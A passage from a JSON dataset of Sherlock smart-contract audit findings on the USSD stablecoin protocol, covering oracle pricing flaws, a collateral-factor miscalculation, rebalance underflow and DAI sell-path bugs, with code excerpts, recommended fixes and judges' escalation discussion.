(, int256 price, , uint256 updatedAt, ) = registry.latestRoundData(\n        token,\n        USD\n    );\n    \n    if (price >= maxPrice or price <= minPrice) revert();\n```\nThis ensures that a false price will not be returned if the underlying asset's value hits the minPrice.",
      "summary": "\nThis bug report is about a risk of incorrect asset pricing by StableOracle in the event of an underlying aggregator reaching the minAnswer. This was found by a group of eight people, including Bauchibred, BugBusters, Madalad, RaymondFam, T1MOH, TheNaubit, berlin-101, chalex.eth, and kiki\\_dev. \n\nStableOracleDAI.sol, StableOracleWBTC.sol, and StableOracleWETH.sol use ChainlinkFeedRegistry to get the price of requested tokens. If the price of an asset drops below the minPrice, the protocol continues to value the token at the minPrice rather than its actual value. This can lead to the protocol minting a much larger amount of stableCoinAmount or returning a much bigger collateral factor. For example, if the minPrice of TokenA is $1 and its price falls to $0.10, the aggregator continues to report $1, resulting in the related function calls entailing a value that is ten times the actual value.\n\nAlthough the use of a combination of oracles could potentially prevent such a situation, there is still a risk of secondary oracles being exploited by malicious users.\n\nThe impact of this vulnerability is that in the event of an asset crash, the protocol can be manipulated to handle calls at an inflated price. \n\nThe recommendation is for StableOracle to cross-check the returned answer against the minPrice/maxPrice and revert if the answer is outside of these bounds. This ensures that a false price will not be returned if the underlying asset's value hits the minPrice.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/598",
      "tags": [],
      "finders": [
        "berlin-101",
        "RaymondFam",
        "T1MOH",
        "BugBusters",
        "chalex.eth",
        "Madalad",
        "kiki\\_dev",
        "TheNaubit",
        "Bauchibred"
      ]
    },
    {
      "id": "19146",
      "title": "M-6: Inconsistency handling of DAI as collateral in the BuyUSSDSellCollateral function",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/515 \n\n## Found by \n0xRobocop, GimelSec, J4de, WATCHPUG, saidam017\n## Summary\n\nDAI is the base asset of the `USSD.sol` contract, when a rebalacing needs to occur during a peg-down recovery, collateral is sold for DAI, which then is used to buy USSD in the DAI / USSD uniswap pool. Hence, when DAI is the collateral, this is not sold because there no existe a path to sell DAI for DAI.\n\n## Vulnerability Detail\n\nThe above behavior is handled when collateral is about to be sold for DAI, see the comment `no need to swap DAI` ([link to the code](https://github.com/sherlock-audit/2023-05-USSD/blob/6d7a9fdfb1f1ed838632c25b6e1b01748d0bafda/ussd-contracts/contracts/USSDRebalancer.sol#L117-L139)):\n\n```solidity\nif (collateralval > amountToBuyLeftUSD) {\n   // sell a portion of collateral and exit\n   if (collateral[i].pathsell.length > 0) {\n       uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n       uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n       IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n       amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n       DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   } \n   else {\n       // no need to swap DAI\n       DAItosell = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * amountToBuyLeftUSD / collateralval;\n   }\n}\n\nelse {\n   // @audit-issue Not handling the case where this is DAI as is done above.\n   // sell all or skip (if collateral is too little, 5% treshold)\n   if (collateralval >= amountToBuyLeftUSD / 20) {\n      uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n      // sell all collateral and move to next one\n      IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n      amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n      DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   }\n}\n```\nThe problem is in the `else branch` of the first if statement `collateralval > amountToBuyLeftUSD`, which lacks the check `if (collateral[i].pathsell.length > 0)`\n\n## Impact\n\nA re-balancing on a peg-down recovery will fail if the `collateralval` of DAI is less than `amountToBuyLeftUSD` but greater than `amountToBuyLeftUSD / 20` since the DAI collateral does not have a sell path.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/6d7a9fdfb1f1ed838632c25b6e1b01748d0bafda/ussd-contracts/contracts/USSDRebalancer.sol#L130-L139\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nHandle the case as is the done on the if branch of `collateralval > amountToBuyLeftUSD`:\n\n```solidity\nif (collateral[i].pathsell.length > 0) {\n  // Sell collateral for DAI\n}\nelse {\n // No need to swap DAI\n}\n```\n\n\n\n\n## Discussion\n\n**0xRobocop**\n\nEscalate for 10 USDC\n\nThis is not a duplicate of #111 \n\nThis issue points to an inconsistency in handling DAI as a collateral during peg-down recovery scenarios. The contract will try to sell DAI, but DAI does not have a sell path, so the transaction will revert.\n\n```solidity\nif (collateralval > amountToBuyLeftUSD) {\n   // sell a portion of collateral and exit\n   if (collateral[i].pathsell.length > 0) {\n       uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n       uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n       IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n       amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n       DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   } \n   else {\n       // no need to swap DAI\n       DAItosell = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * amountToBuyLeftUSD / collateralval;\n   }\n}\n\nelse {\n   // @audit-issue Not handling the case where this is DAI as is done above.\n   // sell all or skip (if collateral is too little, 5% treshold)\n   if (collateralval >= amountToBuyLeftUSD / 20) {\n      uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n      // sell all collateral and move to next one\n      IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n      amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n      DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   }\n}\n```\n\nSee the inconsistency on the upper `if` and `else` branches. The `else` branch may try to sell DAI, but DAI does not have a sell path.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> This is not a duplicate of #111 \n> \n> This issue points to an inconsistency in handling DAI as a collateral during peg-down recovery scenarios. The contract will try to sell DAI, but DAI does not have a sell path, so the transaction will revert.\n> \n> ```solidity\n> if (collateralval > amountToBuyLeftUSD) {\n>    // sell a portion of collateral and exit\n>    if (collateral[i].pathsell.length > 0) {\n>        uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n>        uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n>        IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n>        amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n>        DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n>    } \n>    else {\n>        // no need to swap DAI\n>        DAItosell = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * amountToBuyLeftUSD / collateralval;\n>    }\n> }\n> \n> else {\n>    // @audit-issue Not handling the case where this is DAI as is done above.\n>    // sell all or skip (if collateral is too little, 5% treshold)\n>    if (collateralval >= amountToBuyLeftUSD / 20) {\n>       uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n>       // sell all collateral and move to next one\n>       IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n>       amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n>       DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n>    }\n> }\n> ```\n> \n> See the inconsistency on the upper `if` and `else` branches. The `else` branch may try to sell DAI, but DAI does not have a sell path.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\n@ctf-sec \n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xRobocop](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/515/#issuecomment-1605656433): accepted",
      "summary": "\nThis bug report is about an inconsistency in the handling of DAI as collateral in the BuyUSSDSellCollateral function. The bug was found by 0xRobocop, GimelSec, J4de, WATCHPUG, and saidam017. The issue is that when a rebalancing needs to occur during a peg-down recovery, collateral is sold for DAI, which then is used to buy USSD in the DAI/USSD uniswap pool. However, when DAI is the collateral, this is not sold because there is no existing path to sell DAI for DAI. The problem is in the else branch of the first if statement collateralval > amountToBuyLeftUSD, which lacks the check if (collateral[i].pathsell.length > 0). This means that a re-balancing on a peg-down recovery will fail if the collateralval of DAI is less than amountToBuyLeftUSD but greater than amountToBuyLeftUSD/20. The team recommended handling the case as is done on the if branch of collateralval > amountToBuyLeftUSD. The issue was resolved with 0xRobocop's escalation being accepted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/515",
      "tags": [],
      "finders": [
        "J4de",
        "WATCHPUG",
        "saidam017",
        "0xRobocop",
        "GimelSec"
      ]
    },
    {
      "id": "19145",
      "title": "M-5: Inaccurate collateral factor calculation due to missing collateral asset",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/341 \n\n## Found by \n0xeix, Angry\\_Mustache\\_Man, Bauer, BugHunter101, Dug, PokemonAuditSimulator, TheNaubit, immeas, juancito, mahdikarimi, ravikiran.web3, sakshamguruji, shaka, theOwl\n## Summary\nThe function `collateralFactor()` in the smart contract calculates the collateral factor for the protocol but fails to account for the removal of certain collateral assets. As a result, the total value of the removed collateral assets is not included in the calculation, leading to an inaccurate collateral factor.\n\n## Vulnerability Detail\nThe `collateralFactor()` function calculates the current collateral factor for the protocol. It iterates through each collateral asset in the system and calculates the total value of all collateral assets in USD.\n\nFor each collateral asset, the function retrieves its balance and converts it to a USD value by multiplying it with the asset's price in USD obtained from the corresponding oracle. The balance is adjusted for the decimal precision of the asset. These USD values are accumulated to calculate the totalAssetsUSD.\n```solidity\n   function collateralFactor() public view override returns (uint256) {\n        uint256 totalAssetsUSD = 0;\n        for (uint256 i = 0; i < collateral.length; i++) {\n            totalAssetsUSD +=\n                (((IERC20Upgradeable(collateral[i].token).balanceOf(\n                    address(this)\n                ) * 1e18) /\n                    (10 **\n                        IERC20MetadataUpgradeable(collateral[i].token)\n                            .decimals())) *\n                    collateral[i].oracle.getPriceUSD()) /\n                1e18;\n        }\n\n        return (totalAssetsUSD * 1e6) / totalSupply();\n    }\n```\nHowever, when a collateral asset is removed from the collateral list, the `collateralFactor` function fails to account for its absence. This results in an inaccurate calculation of the collateral factor. Specifically, the totalAssetsUSD variable does not include the value of the removed collateral asset, leading to an underestimation of the total collateral value. The function `SellUSSDBuyCollateral()` in the smart contract is used for rebalancing. However, it relies on the collateralFactor calculation, which has been found to be inaccurate. The collateralFactor calculation does not accurately assess the portions of collateral assets to be bought or sold during rebalancing. This discrepancy can lead to incorrect rebalancing decisions and potentially impact the stability and performance of the protocol.\n```solidity\n    function removeCollateral(uint256 _index) public onlyControl {\n        collateral[_index] = collateral[collateral.length - 1];\n        collateral.pop();\n    }\n```\n## Impact\nAs a consequence, the reported collateral factor may be lower than it should be, potentially affecting the risk assessment and stability of the protocol. \n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSD.sol#L179-L194\n\n## Tool used\n\nManual Review\n\n## Recommendation\nEnsure accurate calculations and maintain the integrity of the collateral factor metric in the protocol's risk management system.",
      "summary": "\nThis bug report is about an issue with the `collateralFactor()` function in the smart contract, which is used to calculate the collateral factor for the protocol. The function iterates through each collateral asset and calculates the total value of all collateral assets in USD. However, when a collateral asset is removed from the list, the function fails to account for its absence, resulting in an inaccurate calculation of the collateral factor. This discrepancy can lead to incorrect rebalancing decisions and potentially impact the stability and performance of the protocol. The bug was found by multiple people and was identified by manual review. The code snippet for the bug can be found at the given link. The impact of this bug is an underestimation of the total collateral value, which could affect the risk assessment and stability of the protocol. The recommendation is to ensure accurate calculations and maintain the integrity of the collateral factor metric in the protocol's risk management system.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/341",
      "tags": [],
      "finders": [
        "Bauer",
        "PokemonAuditSimulator",
        "juancito",
        "immeas",
        "BugHunter101",
        "TheNaubit",
        "Dug",
        "ravikiran.web3",
        "0xeix",
        "Angry\\_Mustache\\_Man",
        "mahdikarimi",
        "shaka",
        "sakshamguruji",
        "theOwl"
      ]
    },
    {
      "id": "19144",
      "title": "M-4: StableOracleWBTC use BTC/USD chainlink oracle to price WBTC which is problematic if WBTC depegs",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/310 \n\n## Found by \nBahurum, Bauchibred, BenRai, RaymondFam, Schpiel, T1MOH, \\_\\_141345\\_\\_, chainNue, chalex.eth, kiki\\_dev, sashik\\_eth\n\n\n## Summary\n\nThe StableOracleWBTC contract utilizes a BTC/USD Chainlink oracle to determine the price of WBTC. However, this approach can lead to potential issues if WBTC were to depeg from BTC. In such a scenario, WBTC would no longer maintain an equivalent value to BTC. This can result in significant problems, including borrowing against a devalued asset and the accumulation of bad debt. Given that the protocol continues to value WBTC based on BTC/USD, the issuance of bad loans would persist, exacerbating the overall level of bad debt.\n\nImportant to note that this is like a 2 in 1 report as the same idea could work on the StableOracleWBGL contract too.\n\n## Vulnerability Detail\n\nThe vulnerability lies in the reliance on a single BTC/USD Chainlink oracle to obtain the price of WBTC. If the bridge connecting WBTC to BTC becomes compromised and WBTC depegs, WBTC may depeg from BTC. Consequently, WBTC's value would no longer be equivalent to BTC, potentially rendering it worthless (hopefully this never happens). The use of the BTC/USD oracle to price WBTC poses risks to the protocol and its users.\n\nThe following code snippet represents the relevant section of the StableOracleWBTC contract responsible for retrieving the price of WBTC using the BTC/USD Chainlink oracle:\n\n```solidity\ncontract StableOracleWBTC is IStableOracle {\n    AggregatorV3Interface priceFeed;\n\n    constructor() {\n        priceFeed = AggregatorV3Interface(\n            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n\n        );\n    }\n\n    function getPriceUSD() external view override returns (uint256) {\n        (, int256 price, , , ) = priceFeed.latestRoundData();\n        // chainlink price data is 8 decimals for WBTC/USD\n        return uint256(price) * 1e10;\n    }\n}\n```\n\nNB: key to note that the above pricefeed is set to the wrong aggregator, the correct one is this: `0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599`\n\n## Impact\n\nShould the WBTC bridge become compromised or WBTC depeg from BTC, the protocol would face severe consequences. The protocol would be burdened with a substantial amount of bad debt stemming from outstanding loans secured by WBTC. Additionally, due to the protocol's reliance on the BTC/USD oracle, the issuance of loans against WBTC would persist even if its value has significantly deteriorated. This would lead to an escalation in bad debt, negatively impacting the protocol's financial stability and overall performance.\n\n## Code Snippet\n\n[StableOracleWBTC.sol#L12-L26](https://github.com/sherlock-audit/2023-05-USSD/blob/6d7a9fdfb1f1ed838632c25b6e1b01748d0bafda/ussd-contracts/contracts/oracles/StableOracleWBTC.sol#L12-L26)\n\n## Tool used\n\nManual review\n\n## Recommendation\n\nTo mitigate the vulnerability mentioned above, it is strongly recommended to implement a double oracle setup for WBTC pricing. This setup would involve integrating both the BTC/USD Chainlink oracle and an additional on-chain liquidity-based oracle, such as UniV3 TWAP.\n\nThe double oracle setup serves two primary purposes. Firstly, it reduces the risk of price manipulation by relying on the Chainlink oracle, which ensures accurate pricing for WBTC. Secondly, incorporating an on-chain liquidity-based oracle acts as a safeguard against WBTC depegging. By monitoring the price derived from the liquidity-based oracle and comparing it to the Chainlink oracle's price, borrowing activities can be halted if the threshold deviation (e.g., 2% lower) is breached.\n\nAdopting a double oracle setup enhances the protocol's stability and minimizes the risks associated with WBTC depegging. It ensures accurate valuation, reduces the accumulation of bad debt, and safeguards the protocol and its users\n\n\n\n\n## Discussion\n\n**Bauchibred**\n\nEscalate for 10 USDC\n\n\n\nI believe this issue has been incorrectly duplicated to #817. While I acknowledge the large number of issues submitted during the contest (approximately 1000), it's crucial to clarify that the concern here is not solely related to oracle addresses, despite the inclusion of wrong aggregators and inactive oracle addresses in the report. The main issue at hand is the potential depegging of WBTC, which is a bridged asset.\n\nTo address this vulnerability, the recommendation proposes implementing a double oracle setup for WBTC pricing, which serves as a safeguard against WBTC depegging.\n\nTo support this escalation, I have provided references to relevant cases:\n- #836 is a sponsor-validated issue that emphasizes the importance of not relying solely on 100% of an asset's oracle price. While it may not directly relate to this specific issue, it underscores the need to consider implementing a \"deviation threshold\" when determining asset prices, particularly in the context of bridged assets.\n-  #862, which is a valid duplicate, explores the potential impact of depegging on the protocol within a different context for this contest.\n- Additionally, references [1](https://github.com/sherlock-audit/2023-04-jojo-judging/blob/533cfb7357175fc97d6816586e95ad39e07892a7/060-M/320.md) and [2](https://github.com/sherlock-audit/2023-04-jojo-judging/blob/533cfb7357175fc97d6816586e95ad39e07892a7/060-M/104-best.md?plain=1#L5) are previous validated findings from other contests that further emphasize the standalone nature and significance of this issue.\n\nI believe these references provide additional insights into the importance of considering measures to mitigate risks associated with bridged assets and emphasize why this issue should be treated as a standalone concern.\n\n\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> \n> \n> I believe this issue has been incorrectly duplicated to #817. While I acknowledge the large number of issues submitted during the contest (approximately 1000), it's crucial to clarify that the concern here is not solely related to oracle addresses, despite the inclusion of wrong aggregators and inactive oracle addresses in the report. The main issue at hand is the potential depegging of WBTC, which is a bridged asset.\n> \n> To address this vulnerability, the recommendation proposes implementing a double oracle setup for WBTC pricing, which serves as a safeguard against WBTC depegging.\n> \n> To support this escalation, I have provided references to relevant cases:\n> - #836 is a sponsor-validated issue that emphasizes the importance of not relying solely on 100% of an asset's oracle price. While it may not directly relate to this specific issue, it underscores the need to consider implementing a \"deviation threshold\" when determining asset prices, particularly in the context of bridged assets.\n> -  #862, which is a valid duplicate, explores the potential impact of depegging on the protocol within a different context for this contest.\n> - Additionally, references [1](https://github.com/sherlock-audit/2023-04-jojo-judging/blob/533cfb7357175fc97d6816586e95ad39e07892a7/060-M/320.md) and [2](https://github.com/sherlock-audit/2023-04-jojo-judging/blob/533cfb7357175fc97d6816586e95ad39e07892a7/060-M/104-best.md?plain=1#L5) are previous validated findings from other contests that further emphasize the standalone nature and significance of this issue.\n> \n> I believe these references provide additional insights into the importance of considering measures to mitigate risks associated with bridged assets and emphasize why this issue should be treated as a standalone concern.\n> \n> \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**twicek**\n\nEscalate for 10 USDC\n\nComments from [Bauchibred](https://github.com/Bauchibred) regarding the fact that the present issue #310 is not a duplicate of #817 are correct.\nHowever, the main argument of this report is that:\n>WBTC may depeg from BTC\n\nThe only fact that WBTC/BTC would depeg is questionable. Since it is issued by a centralized entity (BitGo) it should be treated as trusted, because the only way for it to depeg would be via an error of this centralized entity or if the DAO voted a malicious proposal. See for details: https://www.gemini.com/cryptopedia/wbtc-what-is-wrapped-bitcoin#section-how-w-btc-works\n\nAdditionally, one of the justifications used to support the escalation regarding the deviation threshold mentioned in [#836 ](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/836). There is no guarantee that the TWAP will not stay within the deviation threshold even in the (very) unlikely event that WBTC/BTC depegs if the depegging happens slowly.\n\nRegarding #862, this is not a duplicate to this report because DAI principal depeg risk comes from depegging of the underlying collateral reserves, which as we have seen is not possible for WBTC since the reserves are held by a centralized party. Also #862 specifically related to an overflow problem during a potential DAI depeg which is totally different than this report.\n\nThese are all the reason why I think this report is invalid.\n\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> Comments from [Bauchibred](https://github.com/Bauchibred) regarding the fact that the present issue #310 is not a duplicate of #817 are correct.\n> However, the main argument of this report is that:\n> >WBTC may depeg from BTC\n> \n> The only fact that WBTC/BTC would depeg is questionable. Since it is issued by a centralized entity (BitGo) it should be treated as trusted, because the only way for it to depeg would be via an error of this centralized entity or if the DAO voted a malicious proposal. See for details: https://www.gemini.com/cryptopedia/wbtc-what-is-wrapped-bitcoin#section-how-w-btc-works\n> \n> Additionally, one of the justifications used to support the escalation regarding the deviation threshold mentioned in [#836 ](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/836). There is no guarantee that the TWAP will not stay within the deviation threshold even in the (very) unlikely event that WBTC/BTC depegs if the depegging happens slowly.\n> \n> Regarding #862, this is not a duplicate to this report because DAI principal depeg risk comes from depegging of the underlying collateral reserves, which as we have seen is not possible for WBTC since the reserves are held by a centralized party. Also #862 specifically related to an overflow problem during a potential DAI depeg which is totally different than this report.\n> \n> These are all the reason why I think this report is invalid.\n> \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\n@Bauchibred any further comments on the validity of the issue due? \n\n**Bauchibred**\n\n@hrishibhat I still think issue should be valid and stand on its own, the reply to my escalation was that the idea of “WBTC depegging is not valid”, but I argue that that's wrong, Wrapped BTCs have depegged multiple times in the past, one of the popular instance being after the whole FTX saga, though fair enough that was soBTC, now worth around 7% of what it's supposed to be pegged to.\n\nNote that Chainlink even provides a separate price feed to query the WBTC/BTC price,seen [here](https://data.chain.link/ethereum/mainnet/crypto-other/wbtc-btc).\n\nSo I still believe that the price of WBTC/USD for more accuracy should be calculated based on WBTC/BTC and BTC/USD price feeds instead of directly using the BTC/USD feed. \n\nAdditionally [this article](https://thebitcoinmanual.com/articles/why-wrapped-bitcoin-depeg/) from the bitcoin manual, could provide more insight on how and why wrapped bitcoins could depeg. \n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\nThis is not a duplicate of #817 \nConsidering this issue and other duplicates of this issue as a valid medium given the edge case possibility of WBTC de-pegging.\n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Bauchibred](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/310/#issuecomment-1604772582): accepted\n- [twicek](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/310/#issuecomment-1605817251): rejected",
      "summary": "\nA bug report has been identified in the StableOracleWBTC contract which uses a BTC/USD Chainlink oracle to determine the price of WBTC, a bridged asset. This approach can lead to potential issues if WBTC were to depeg from BTC, rendering it worthless and resulting in the accumulation of bad debt. To mitigate this vulnerability, it is recommended to implement a double oracle setup for WBTC pricing, which involves integrating both the BTC/USD Chainlink oracle and an additional on-chain liquidity-based oracle, such as UniV3 TWAP. This setup reduces the risk of price manipulation and serves as a safeguard against WBTC depegging. It also ensures accurate valuation, reduces the accumulation of bad debt, and safeguards the protocol and its users. The bug report has been discussed and the escalations have been resolved successfully.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/310",
      "tags": [],
      "finders": [
        "Bahurum",
        "chainNue",
        "RaymondFam",
        "T1MOH",
        "chalex.eth",
        "BenRai",
        "kiki\\_dev",
        "\\_\\_141345\\_\\_",
        "sashik\\_eth",
        "Bauchibred",
        "Schpiel"
      ]
    },
    {
      "id": "19143",
      "title": "M-3: rebalance process incase of  selling the collateral, could revert because of underflow calculation",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/111 \n\n## Found by \n0xHati, Dug, GimelSec, Juntao, PokemonAuditSimulator, T1MOH, WATCHPUG, XDZIBEC, ast3ros, saidam017, toshii, tsvetanovv, twicek\n## Summary\n\nrebalance process, will try to sell the collateral in case of peg-down. However, the process can revert because the calculation can underflow.\n\n## Vulnerability Detail\n\nInside `rebalance()` call, if `BuyUSSDSellCollateral()` is triggered, it will try to sell the current collateral to `baseAsset`. The asset that will be sold (`amountToSellUnits`) first calculated. Then swap it to `baseAsset` via uniswap. However, when subtracting `amountToBuyLeftUSD`, it with result of `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)`. There is no guarantee `amountToBuyLeftUSD` always bigger than `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)`.\n\nThis causing the call could revert in case `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)` > `amountToBuyLeftUSD`.\n\nThere are two branch where `amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)` is performed : \n\n1. Incase `collateralval > amountToBuyLeftUSD`\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L116-L125\n\n`collateralval` is calculated using oracle price, thus the result of swap not guaranteed to reflect the proportion of `amountToBuyLefUSD` against `collateralval` ratio, and could result in returning `baseAsset` larger than expected. And potentially  `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)` > `amountToBuyLeftUSD`\n\n```solidity\n        uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n        if (collateralval > amountToBuyLeftUSD) {\n          // sell a portion of collateral and exit\n          if (collateral[i].pathsell.length > 0) {\n            uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n            uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n            IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n            amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n            DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n          } else {\n```\n\n2. Incase `collateralval < amountToBuyLeftUSD`\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L132-L138\n\nThis also can't guarantee `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)` < `amountToBuyLeftUSD`.\n\n```solidity\n          if (collateralval >= amountToBuyLeftUSD / 20) {\n            uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n            // sell all collateral and move to next one\n            IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n            amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n            DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n          }\n```\n\n## Impact\n\nRebalance process can revert caused by underflow calculation.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L116-L125\nhttps://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/USSDRebalancer.sol#L132-L138\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCheck if `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)` > `amountToBuyLeftUSD`, in that case, just set `amountToBuyLeftUSD` to 0.\n\n```solidity\n          ...\n            uint baseAssetChange = IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n            if (baseAssetChange > amountToBuyLeftUSD) {\n                amountToBuyLeftUSD = 0;\n            } else {\n                amountToBuyLeftUSD -= baseAssetChange;\n           }\n            DAItosell += baseAssetChange;\n          ...\n```\n\n\n\n\n## Discussion\n\n**hrishibhat**\n\nThis is a valid medium",
